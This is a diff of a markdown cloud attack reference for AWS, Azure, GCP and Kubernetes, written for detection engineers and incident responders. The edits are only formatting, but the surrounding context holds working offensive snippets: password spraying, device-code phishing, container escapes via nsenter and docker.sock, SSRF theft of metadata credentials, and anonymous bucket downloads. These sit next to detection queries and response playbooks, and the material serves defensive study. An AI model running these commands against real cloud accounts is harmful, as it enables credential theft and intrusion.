@@ -1,13 +1,13 @@
 # Cloud Attack Reference
 
 > Comprehensive cloud attack techniques for AWS, Azure, and GCP — aligned to MITRE ATT&CK for Cloud.  
-> **For defensive security engineers and incident responders: understand attacker techniques to build better detections and controls.**
+> For defensive security engineers and incident responders: understand attacker techniques to build better detections and controls.
 
 | | |
 |---|---|
-| **Read this when** | Building or tuning cloud detections, running IR on a suspected AWS/Azure/GCP or Kubernetes compromise, planning a red/purple-team cloud engagement |
-| **Start at** | [Cloud Attack Taxonomy & Initial Access](#_1-cloud-attack-taxonomy-amp-initial-access), [AWS Attack Techniques](#_2-aws-attack-techniques), [Cloud Security Posture & Detection](#_10-cloud-security-posture-amp-detection) |
-| **Pairs with** | [CLOUD_SECURITY_REFERENCE.md](CLOUD_SECURITY_REFERENCE.md), [KUBERNETES_SECURITY_REFERENCE.md](KUBERNETES_SECURITY_REFERENCE.md), [DETECTION_RULES_REFERENCE.md](DETECTION_RULES_REFERENCE.md), [INCIDENT_RESPONSE_REFERENCE.md](INCIDENT_RESPONSE_REFERENCE.md) |
+| Read this when | Building or tuning cloud detections, running IR on a suspected AWS/Azure/GCP or Kubernetes compromise, planning a red/purple-team cloud engagement |
+| Start at | [Cloud Attack Taxonomy & Initial Access](#_1-cloud-attack-taxonomy-amp-initial-access), [AWS Attack Techniques](#_2-aws-attack-techniques), [Cloud Security Posture & Detection](#_10-cloud-security-posture-amp-detection) |
+| Pairs with | [CLOUD_SECURITY_REFERENCE.md](CLOUD_SECURITY_REFERENCE.md), [KUBERNETES_SECURITY_REFERENCE.md](KUBERNETES_SECURITY_REFERENCE.md), [DETECTION_RULES_REFERENCE.md](DETECTION_RULES_REFERENCE.md), [INCIDENT_RESPONSE_REFERENCE.md](INCIDENT_RESPONSE_REFERENCE.md) |
 
 ---
 
@@ -30,7 +30,7 @@
 
 ### MITRE ATT&CK for Cloud Coverage
 
-ATT&CK for Cloud spans three matrices: **IaaS** (covering AWS, Azure, GCP, OCI), **SaaS** (Microsoft 365, Google Workspace, Salesforce), and **Containers** (Kubernetes, Docker). Key tactic-level mappings:
+ATT&CK for Cloud spans three matrices: IaaS (covering AWS, Azure, GCP, OCI), SaaS (Microsoft 365, Google Workspace, Salesforce), and Containers (Kubernetes, Docker). Key tactic-level mappings:
 
 | ATT&CK Tactic | Cloud Manifestation | Key Technique IDs |
 |---|---|---|
@@ -50,7 +50,7 @@ ATT&CK for Cloud spans three matrices: **IaaS** (covering AWS, Azure, GCP, OCI),
 
 #### Exposed Credentials
 
-**GitHub Secrets and Leaked API Keys**
+GitHub Secrets and Leaked API Keys
 
 Attackers continuously scan public repositories and code hosting platforms for committed cloud credentials:
 
@@ -70,7 +70,7 @@ aws sts get-caller-identity --profile suspected_leaked
 
 Detection: AWS GuardDuty finding `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` triggers when credentials issued to EC2 instances are used from external IPs. CloudTrail event `ConsoleLogin` from unexpected geolocation + `GetCallerIdentity` calls from new IPs/ASNs are key indicators.
 
-**Misconfigured S3 Buckets**
+Misconfigured S3 Buckets
 
 ```bash
 # Unauthenticated bucket enumeration
@@ -90,13 +90,13 @@ aws s3 cp s3://target/terraform.tfstate . --no-sign-request
 
 CloudTrail detection: `GetObject` events with `userIdentity.type = Anonymous` or `userIdentity.accountId = anonymous`. GuardDuty: `Policy:S3/BucketPublicAccessGranted`, `Discovery:S3/BucketEnumeration.Unusual`.
 
-**.env Files and CI/CD Pipeline Secrets**
+.env Files and CI/CD Pipeline Secrets
 
 Common patterns: `.env` files with `AWS_ACCESS_KEY_ID`, `GOOGLE_APPLICATION_CREDENTIALS` pointing to JSON files baked into Docker images, `AZURE_CLIENT_SECRET` in GitHub Actions workflow YAML. Terraform state files (`terraform.tfstate`) frequently contain plaintext credentials and resource details used during provisioning.
 
 #### Credential Stuffing and MFA Bypass
 
-**Password Spraying Against Cloud Identity Providers**
+Password Spraying Against Cloud Identity Providers
 
 ```bash
 # AWS Console IAM user spray (low and slow)
@@ -111,12 +111,12 @@ Invoke-Spray365 -UserList users.txt -PasswordList passwords.txt -OutFile results
 python3 gcp-spray.py --users users.txt --password 'Password123'
 ```
 
-**MFA Bypass Techniques**
+MFA Bypass Techniques
 
-- **Adversary-in-the-Middle (AiTM)**: Proxy (evilginx2, Modlishka) intercepts authentication flow and captures session cookies post-MFA, enabling replay attacks without re-triggering MFA.
-- **OAuth Device Code Phishing**: Attacker generates device code, sends victim to `https://microsoft.com/devicelogin` with the code, victim authenticates and grants attacker persistent access token without MFA re-challenge.
-- **Authenticator App Fatigue**: Repeated MFA push notifications until user approves to stop the noise.
-- **SIM Swapping**: Target SMS-based MFA by porting victim's phone number.
+- Adversary-in-the-Middle (AiTM): Proxy (evilginx2, Modlishka) intercepts authentication flow and captures session cookies post-MFA, enabling replay attacks without re-triggering MFA.
+- OAuth Device Code Phishing: Attacker generates device code, sends victim to `https://microsoft.com/devicelogin` with the code, victim authenticates and grants attacker persistent access token without MFA re-challenge.
+- Authenticator App Fatigue: Repeated MFA push notifications until user approves to stop the noise.
+- SIM Swapping: Target SMS-based MFA by porting victim's phone number.
 
 #### SSRF to Instance Metadata Service (IMDS)
 
@@ -207,7 +207,7 @@ aws ssm describe-parameters
 aws ssm get-parameter --name /prod/db/password --with-decryption
 ```
 
-**Pacu Modules for Enumeration**
+Pacu Modules for Enumeration
 
 | Module | Purpose |
 |---|---|
@@ -359,7 +359,7 @@ aws ssm create-document \
 | Secrets access | `GetSecretValue` | From unexpected principal |
 | GuardDuty disable | `DeleteDetector`, `UpdateDetector` | Any occurrence |
 
-### GuardDuty Finding Types — AWS
+### GuardDuty Finding Types: AWS
 
 | Finding Type | Severity | Description |
 |---|---|---|
@@ -412,7 +412,7 @@ Invoke-DumpApps -Tokens $tokens
 
 ### Token Theft Techniques
 
-**Device Code Phishing**
+Device Code Phishing
 
 ```powershell
 # Step 1: Attacker generates device code
@@ -435,7 +435,7 @@ $poll_body = @{
 $token = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method POST -Body $poll_body
 ```
 
-**Primary Refresh Token (PRT) Extraction**
+Primary Refresh Token (PRT) Extraction
 
 ```powershell
 # Extract PRT from Azure AD joined Windows device (requires local admin)
@@ -512,7 +512,7 @@ az storage account generate-sas \
 
 ### Azure Detection: Unified Audit Log and Sign-in Logs
 
-**KQL Queries for Microsoft Sentinel**
+KQL Queries for Microsoft Sentinel
 
 ```kql
 // Suspicious OAuth consent grant
@@ -681,13 +681,13 @@ gsutil cp -r gs://TARGET_BUCKET/ /tmp/loot/
 
 ### GCP Detection: Cloud Audit Logs
 
-**Types:**
-- **Admin Activity** (always enabled, free): Create/delete/modify resources, IAM changes
-- **Data Access** (optional, charged): Read operations, data reads, user-driven access
-- **System Event**: GCP system-generated events
-- **Policy Denied**: Requests blocked by organization policy
+Types:
+- Admin Activity (always enabled, free): Create/delete/modify resources, IAM changes
+- Data Access (optional, charged): Read operations, data reads, user-driven access
+- System Event: GCP system-generated events
+- Policy Denied: Requests blocked by organization policy
 
-**Cloud Logging / Chronicle Queries**
+Cloud Logging / Chronicle Queries
 
 ```sql
 -- Service account key creation (potential persistence)
@@ -754,7 +754,7 @@ cat ~/.kube/config  # Contains cluster endpoint, CA cert, and auth token or cert
 
 ### Container Escape Techniques
 
-**Privileged Container Escape**
+Privileged Container Escape
 
 ```bash
 # Check if running privileged
@@ -774,7 +774,7 @@ cat /mnt/host/var/lib/kubelet/kubeconfig
 cat /mnt/host/etc/kubernetes/admin.conf
 ```
 
-**Host PID Namespace Escape**
+Host PID Namespace Escape
 
 ```bash
 # If hostPID: true in pod spec
@@ -786,7 +786,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Now in host namespaces with root privileges
 ```
 
-**Docker Socket Mount**
+Docker Socket Mount
 
 ```bash
 # Check if docker.sock is mounted
@@ -806,7 +806,7 @@ docker -H unix:///var/run/docker.sock run \
   nsenter -t 1 -m -u -i -n -p -- bash
 ```
 
-**Dangerous Capabilities**
+Dangerous Capabilities
 
 ```bash
 # CAP_SYS_ADMIN — most dangerous, many escape paths
@@ -887,7 +887,7 @@ ETCDCTL_API=3 etcdctl \
 
 ### Kubernetes Detection: Audit Logs and Falco
 
-**Kubernetes Audit Log Fields to Alert**
+Kubernetes Audit Log Fields to Alert
 
 | Event | Suspicious Indicators |
 |---|---|
@@ -897,7 +897,7 @@ ETCDCTL_API=3 etcdctl \
 | `get secrets` | Bulk retrieval, from unexpected service accounts |
 | `create daemonsets` | Outside expected namespaces |
 
-**Falco Rules for Container Escapes**
+Falco Rules for Container Escapes
 
 ```yaml
 # Falco: detect privileged container spawn
@@ -938,7 +938,7 @@ ETCDCTL_API=3 etcdctl \
   priority: CRITICAL
 ```
 
-**kube-bench CIS Compliance**
+kube-bench CIS Compliance
 
 ```bash
 # Run CIS Kubernetes benchmark
@@ -1059,7 +1059,7 @@ aws ssm get-parameters \
 
 ### Serverless Detection
 
-**Lambda CloudWatch Log Patterns**
+Lambda CloudWatch Log Patterns
 
 ```bash
 # Query for unusual outbound connections in Lambda logs
@@ -1084,7 +1084,7 @@ aws cloudwatch get-metric-statistics \
   --end-time 2024-01-02T00:00:00
 ```
 
-**VPC Flow Log Analysis for Serverless**
+VPC Flow Log Analysis for Serverless
 
 ```bash
 # Detect Lambda data exfiltration via VPC Flow Logs
@@ -1235,7 +1235,7 @@ aws ssm create-association \
 
 ### Persistence Indicators in CloudTrail
 
-**CloudTrail Events to Correlate for Persistence Detection**
+CloudTrail Events to Correlate for Persistence Detection
 
 ```kql
 // Splunk query — detect IAM backdoor sequence
@@ -1360,7 +1360,7 @@ aws redshift create-endpoint-access \
 
 ### DLP Controls and Detection
 
-**Amazon Macie for S3 DLP**
+Amazon Macie for S3 DLP
 
 ```bash
 # Enable Macie and configure sensitive data discovery
@@ -1378,7 +1378,7 @@ aws macie2 create-classification-job \
 # Macie findings include: CREDENTIALS, FINANCIAL_INFORMATION, PERSONAL_INFORMATION
 ```
 
-**GuardDuty Exfiltration Findings**
+GuardDuty Exfiltration Findings
 
 | Finding | Description |
 |---|---|
@@ -1389,7 +1389,7 @@ aws macie2 create-classification-job \
 | `Stealth:S3/ServerAccessLoggingDisabled` | S3 server access logging disabled |
 | `Impact:EC2/AbusedDomainRequest.Reputation` | DNS-based data exfiltration |
 
-**VPC Flow Log Anomaly Detection**
+VPC Flow Log Anomaly Detection
 
 ```sql
 -- CloudWatch Logs Insights: detect high-volume outbound transfers
@@ -1416,7 +1416,7 @@ index=vpc_flowlogs action=ACCEPT
 
 ### SSRF to Cloud Metadata Services
 
-**AWS IMDSv1 (Legacy, No Token Required)**
+AWS IMDSv1 (Legacy, No Token Required)
 
 ```bash
 # Full IMDSv1 exploitation chain
@@ -1443,7 +1443,7 @@ curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-dat
 # Enforce IMDSv2: aws ec2 modify-instance-metadata-options --http-tokens required
 ```
 
-**GCP Metadata Service**
+GCP Metadata Service
 
 ```bash
 # GCP requires Metadata-Flavor: Google header (prevents basic SSRF)
@@ -1471,7 +1471,7 @@ curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-
 # Some apps allow internal DNS names — try metadata.google.internal vs IP
 ```
 
-**Azure IMDS**
+Azure IMDS
 
 ```bash
 # Azure IMDS requires Metadata: true header
@@ -1609,7 +1609,7 @@ print('Payload:', json.dumps(payload, indent=2))
 
 ### Cloud Security Posture Management (CSPM)
 
-**AWS Security Hub**
+AWS Security Hub
 
 ```bash
 # Enable Security Hub with all standards
@@ -1639,7 +1639,7 @@ aws securityhub get-findings \
 # 4.1  Ensure no security groups allow ingress from 0.0.0.0/0 to port 22
 ```
 
-**Third-Party CSPM Tools**
+Third-Party CSPM Tools
 
 | Tool | Strengths | Coverage |
 |---|---|---|
@@ -1662,7 +1662,7 @@ prowler aws -c iam_no_root_access_key iam_password_policy_uppercase \
   s3_bucket_no_public_access cloudtrail_multi_region_enabled
 ```
 
-### AWS GuardDuty — Threat Detection
+### AWS GuardDuty: Threat Detection
 
 ```bash
 # Enable GuardDuty with S3, EKS, Malware protection
@@ -1744,7 +1744,7 @@ HAVING COUNT(DISTINCT awsRegion) > 5
 
 ### Cloud Incident Response Playbooks
 
-**Phase 1: Isolate Compromised IAM Identity**
+Phase 1: Isolate Compromised IAM Identity
 
 ```bash
 # STEP 1: Attach explicit deny policy to compromised user/role
@@ -1795,7 +1795,7 @@ aws iam delete-access-key \
 aws iam create-access-key --user-name REPLACEMENT_USER
 ```
 
-**Phase 2: Preserve Evidence**
+Phase 2: Preserve Evidence
 
 ```bash
 # Preserve CloudTrail logs — copy to isolated forensics account S3
@@ -1831,7 +1831,7 @@ aws ec2 create-flow-logs \
   --log-destination arn:aws:s3:::forensics-flow-logs
 ```
 
-**Phase 3: Scope and Contain**
+Phase 3: Scope and Contain
 
 ```bash
 # Identify all resources created/modified by compromised identity
@@ -1862,7 +1862,7 @@ aws ec2 modify-instance-attribute \
   --groups QUARANTINE_SG_ID
 ```
 
-### Microsoft Defender for Cloud — Azure Detection
+### Microsoft Defender for Cloud: Azure Detection
 
 ```kql
 // Sentinel: Detect Azure token replay across different IPs
@@ -1904,7 +1904,7 @@ SigninLogs
 
 ### GCP Threat Detection and Chronicle Integration
 
-**Security Command Center Event Threat Detection**
+Security Command Center Event Threat Detection
 
 ```bash
 # Enable Event Threat Detection (requires Security Command Center Premium)
@@ -1921,7 +1921,7 @@ gcloud scc settings update \
 # DISCOVERY_SCAN_PORT_SCANNING
 ```
 
-**BigQuery/Chronicle Detection Queries**
+BigQuery/Chronicle Detection Queries
 
 ```sql
 -- Chronicle YARA-L rule for unusual GCP API activity
@@ -1953,7 +1953,7 @@ ORDER BY key_creates DESC
 
 ### Cloud Forensics Reference
 
-**Evidence Collection Priority**
+Evidence Collection Priority
 
 | Priority | Evidence Type | Tool/Method |
 |---|---|---|
@@ -1961,12 +1961,12 @@ ORDER BY key_creates DESC
 | 2 | GuardDuty findings | Export via findings export or EventBridge |
 | 3 | VPC Flow Logs | Download from CloudWatch/S3 |
 | 4 | Memory capture | SSM Run Command + avml or LiME |
-| 5 | Disk image | EBS snapshot → restore → dd |
+| 5 | Disk image | EBS snapshot -> restore -> dd |
 | 6 | Network captures | VPC Traffic Mirroring or instance-level tcpdump |
 | 7 | Application logs | CloudWatch Logs, S3 access logs |
 | 8 | Container logs | kubectl logs, Falco alerts |
 
-**CloudTrail Integrity Verification**
+CloudTrail Integrity Verification
 
 ```bash
 # Verify CloudTrail log file integrity
